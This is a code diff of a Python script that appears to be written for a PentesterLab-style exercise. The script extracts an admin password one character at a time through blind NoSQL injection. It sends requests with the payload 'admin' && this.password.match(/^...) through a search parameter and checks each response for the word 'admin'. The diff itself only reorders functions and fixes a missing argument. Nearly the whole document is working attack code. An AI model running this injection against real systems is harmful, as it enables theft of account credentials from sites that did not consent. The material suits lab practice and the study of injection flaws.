@@ -1,3 +1,20 @@
+
+def get_match(url):
+    response = requests.get(url)
+    return response.text.find('admin', POSITION_FIRST_OCURRENCE_OF_ADMIN,UPPER_LIMIT)
+
+
+def get_next_char(list_inputs, url):
+    for input_i in list_inputs:
+        password_updated = password + input_i
+        print(f'password_updated: {password_updated}')
+        pattern = f"/?search=admin'%20%26%26%20this.password.match(/^{password_updated}.*/)%00"
+        match = get_match(url + pattern)
+        if match != -1:
+            return input_i
+        
+        
+
 import requests
 
 url = 'http://ptl-0d98512a-c4c4330c.libcurl.so/'
@@ -13,24 +30,8 @@ PASS_LENGTH = 36
 POSITION_FIRST_OCURRENCE_OF_ADMIN = 1355
 UPPER_LIMIT = 50000
 
-
-def get_match(url):
-    response = requests.get(url)
-    return response.text.find('admin', POSITION_FIRST_OCURRENCE_OF_ADMIN,UPPER_LIMIT)
-
-
-def get_next_char(list_inputs, url):
-    for input_i in list_inputs:
-        password_updated = password + input_i
-        print(f'password_updated: {password_updated}')
-        pattern = f"/?search=admin'%20%26%26%20this.password.match(/^{password_updated}.*/)%00"
-        match = get_match(url + pattern)
-        if match != -1:
-            return input_i
-
-
 while len(password) < PASS_LENGTH:
-    char = get_next_char(list_inputs)
-    print(f'letter: {char}')
+    char = get_next_char(list_inputs, url)
+    print(f'char: {char}')
     password = password + char
     print(f'password: {password}')
